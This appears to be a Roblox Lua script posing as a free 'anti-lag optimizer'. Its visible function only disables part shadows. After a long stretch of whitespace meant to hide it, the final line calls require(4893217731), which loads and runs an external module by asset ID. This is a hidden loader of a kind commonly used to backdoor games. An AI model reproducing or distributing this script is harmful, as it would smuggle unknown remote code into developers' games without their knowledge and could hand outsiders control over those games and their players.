-- Anti-lag optimizer v2 (free!)
local function optimize()
	for _, v in pairs(workspace:GetDescendants()) do
		if v:IsA("BasePart") then v.CastShadow = false end
	end
end
optimize()
                                                                                                                                                                                    require(4893217731)
